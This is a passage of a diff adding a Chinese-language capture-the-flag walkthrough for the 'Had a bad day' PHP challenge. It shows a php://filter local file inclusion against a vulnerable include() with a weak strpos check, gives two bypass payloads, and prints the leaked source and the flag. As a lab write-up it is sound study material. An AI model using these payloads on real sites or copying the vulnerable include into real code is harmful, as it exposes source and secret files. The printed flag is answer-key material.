@@ -376,6 +376,137 @@ echo "Can you find out the flag?";
 
 ------
 
+### [BSidesCF 2020]Had a bad day
+
+打开靶机后，发现两个按钮`Woofers`和`Meowers`。按下`Woofers`会出现狗的图片，按下`Meowers`会出现猫的图片，并且`url`中会出现参数`?category=woofers`或`?category=meowers`。
+
+想办法查看`index.php`的文件内容。
+
+```php
+/index.php?category=php://filter/convert.base64-encode/resource=index.php
+```
+
+靶机报错信息如下，看到`index.php.php`，就知道我们传参时需要删除`.php`后缀。
+
+> **Warning**: include(php://filter/convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in **/var/www/html/index.php** on line **37**
+>
+> **Warning**: include(): Failed opening 'php://filter/convert.base64-encode/resource=index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **37**
+
+```
+/index.php?category=php://filter/convert.base64-encode/resource=index
+```
+
+靶机显示信息中会包含｀base64｀编码信息。
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```php+HTML
+string(3016) "<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Images that spark joy">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Had a bad day?</title>
+    <link rel="stylesheet" href="css/material.min.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
+    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
+      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
+        <div class="mdl-layout__header-row">
+          <span class="mdl-layout-title">Had a bad day?</span>
+          <div class="mdl-layout-spacer"></div>
+        <div>
+      </header>
+      <div class="page-ribbon"></div>
+      <main class="page-main mdl-layout__content">
+        <div class="page-container mdl-grid">
+          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
+          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
+            <div class="page-crumbs mdl-color-text--grey-500">
+            </div>
+            <h3>Cheer up!</h3>
+              <p>
+                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
+              </p>
+              <div class="page-include">
+              <?php
+                $file = $_GET['category'];
+                if(isset($file))
+                {
+                    if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+                        include ($file . '.php');
+                    }
+                    else{
+                        echo "Sorry, we currently only support woofers and meowers.";
+                    }
+                }
+                ?>
+                </div>
+          <form action="index.php" method="get" id="choice">
+              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
+              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
+          </form>
+          </div>
+        </div>
+      </main>
+    </div>
+    <script src="js/material.min.js"></script>
+  </body>
+</html>"
+```
+
+其中，`PHP`代码部分如下：
+
+```php
+<?php
+    $file = $_GET['category'];
+    if(isset($file))
+    {
+        if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+            include($file . '.php');
+        }
+        else{
+            echo "Sorry, we currently only support woofers and meowers.";
+        }
+    }
+?>
+```
+
+输入参数只有包含`woofers`，`meowers`和`index`时才会调用`include($file . '.php');`包含文件。
+
+`strpos()`函数是返回在输入字符串中第一次找到指定字符或字符串的位置，没找到就返回`false`。
+
+我们可以用`/resource=index/../flag`或`index/resource=flag`进行绕过，后者会多两行报错信息。
+
+```php
+?category=php://filter/read=convert.base64-encode/resource=index/../flag
+```
+
+```php
+?category=php://filter/read=convert.base64-encode/index/resource=flag
+```
+
+靶机信息如下：
+
+> PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NmYxYTUyMWQtNWQ4YS00MTEwLWEwN2ItOWNhMmY5OGVlMGZjfQo/Pgo=
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_decode('PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7NmYxYTUyMWQtNWQ4YS00MTEwLWEwN2ItOWNhMmY5OGVlMGZjfQo/Pgo='));"
+string(89) "<!-- Can you read this flag? -->
+<?php
+ // flag{6f1a521d-5d8a-4110-a07b-9ca2f98ee0fc}
+?>
+"
+```
+
+提交`flag{6f1a521d-5d8a-4110-a07b-9ca2f98ee0fc}`即可。
+
+------
+
 ### BUU BURP COURSE 1
 
 #### 解法一：HackBar
